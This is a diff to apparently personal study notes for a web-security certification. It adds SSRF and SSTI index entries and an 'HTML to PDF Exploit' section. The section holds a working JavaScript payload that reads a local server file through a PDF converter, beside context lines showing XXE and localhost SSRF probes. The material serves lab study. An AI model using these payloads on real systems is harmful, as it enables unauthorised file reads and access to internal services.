@@ -9,6 +9,9 @@ Maybe we can the acronym BSCP, like OSCP?
 [Privilege Escalation JSON RoleId](#privesc-json-roleid)  
 [SQLi Data Exfiltration](#sql-injection-data-exfiltration)  
 [XML entities & Injections](#xxe-injection)  
+[SSRF Server side request forgery](#ssrf---server-side-request-forgery)  
+[SSTI Server side template injection](#ssti---server-side-template-injection)  
+
 
 ## Cross Site Scripting
 
@@ -358,6 +361,27 @@ http://127.1:6566/admin
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:6566/"> ]>  
 
 ```  
+
+### HTML to PDF Exploit
+
+[HTML to PDF converters such as wkhtmltopdf exploited to read local file(SSRF)](https://www.sidechannel.blog/en/html-to-pdf-converters-can-i-hack-them/index.html)  
+
+```html
+<html>
+ <body>
+  <script>
+   x = new XMLHttpRequest;
+   x.onload = function() {
+    document.write(this.responseText)
+   };
+   x.open("GET", "file:///home/carlos/secret");
+   x.send();
+  </script>
+ </body>
+</html>
+
+```
+
 
 <sup> SSRF Section incomplete </sup>  
 
